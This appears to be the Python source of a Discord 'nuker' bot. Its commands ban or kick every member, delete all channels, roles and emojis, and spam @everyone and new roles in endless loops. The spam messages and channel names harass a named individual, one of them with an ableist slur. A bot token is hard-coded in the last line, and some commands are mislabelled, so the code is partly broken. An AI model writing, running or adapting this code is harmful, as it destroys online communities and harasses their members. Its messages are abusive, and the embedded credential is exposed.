# nuke_uwu #
#---------------------------------#
# Multi-function Discord Nuker bot coded in Python #
# Version: v1.1.2 #
#---------------------------------#

import discord
from discord.ext.commands import *
from discord.ext import commands
import random
import asyncio
import json
from itertools import cycle
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get






## --                    -- ##
## --   INITIALIZATION   -- ##
## --                    -- ##


## -- Declares the bot, passes it a prefix and lets it know to (hopefully) only listen to itself. -- ##
bot = commands.Bot(command_prefix='&&')
client = commands.Bot(command_prefix='&&')
bot.remove_command('help')



## -- BOT IS READY -- ##
@bot.event
async def on_ready():
#BOT STATUS#
    print("Bot Is Online! Getting Ready To Spam.")
    print(f"Bot Status: Online!...")






## --              -- ##
## --   COMMANDS   -- ##
## --              -- ##


## -- KICK -- ##
#Command: !kick #
@bot.command(pass_context=True)
async def kick(ctx, user : discord.Member):
    await ctx.message.delete()
    await ctx.guild.kick(user)
    print (f"{user.name} has been kicked from {ctx.guild.name}")
    print ("Action Completed: kick")


## -- KICK ALL -- ##
#Command: !kall #
@bot.command(pass_context=True)
async def kall(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.kick(user)
            print (f"{user.name} has been kicked from {ctx.guild.name}")
        except:
            print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
    print ("Action Completed: kall")



## -- BAN ALL -- ##
#Command: !ball #
@bot.command(pass_context=True)
async def ball(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
    print ("Action Completed: ball")  



## -- DELETE ALL ___ -- ##
#Command: !dall [condition] #
@bot.command(pass_context=True)
async def dall(ctx, condition):
        if condition.lower() == "channels":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print (f"{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall channels")
        elif condition.lower() == "roles":
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (f"{role.name} has been deleted in {ctx.guild.name}")
                except discord.Forbidden:
                    print (f"You do not have permission to delete {role.name} in {ctx.guild.name}")
            print ("Action Completed: dall roles")
        elif condition.lower() == "emojis":
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (f"{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall emojis")
        elif condition.lower() == "all":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print (f"{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (f"{role.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (f"{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall all")



## -- FUCK SERVER -- ##
#Command: !fuckserver #
@bot.command(pass_context=True)
async def fuckserver(ctx):
    await ctx.message.delete()
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print (f"{channel.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
    print ("Server has been fucked.")



## -- SPAM MESSAGE -- ##
#Command: !spam #
@bot.command(pass_context=True)
async def spam(ctx): #run "!spam" to run the command
    await ctx.message.delete()
    while True:
        await ctx.send("@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.\n@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.")
        await ctx.send("@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.\n@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.")
        await ctx.send("@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.\n@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.")
        await ctx.send("@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.\n@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.")
        await ctx.send("@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.\n@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.")


## -- SPAM CREATE ROLES -- ##
#Command: !roles #
@bot.command(pass_context=True)
async def roles(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="Role Spam is fun")



## -- DELETE ALL ROLES -- ##
#Command: !delroles #
@bot.command(pass_context=True)
async def delroles(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="Role Spam is fun")



## -- REMOVE ALL CHANNELS -- ##
#Command: !delchannels #
@bot.command(pass_context=True)
async def delchannels(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="Role Spam is fun")



##MAKE CHANNELS##(!channels)
@bot.command(pass_context=True)
async def channels(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.create_text_channel('Russian is autistic') #you can change the channel name by replacing 'nuked' to any name
    await guild.create_text_channel('Russian is autistic')
    await guild.create_text_channel('Russian is autistic')
    await guild.create_text_channel('Russian is autistic')    
    await guild.create_text_channel('Russian is autistic')


## -- STARTS THE BOT BY PASSING APPLICATION TOKEN -- ##
bot.run ("NTk5NTQ0NjAzNjY1NzYwMjc2.XSm6hg.jtu5mtQdbb5HwgaITBsZbIQPN2U")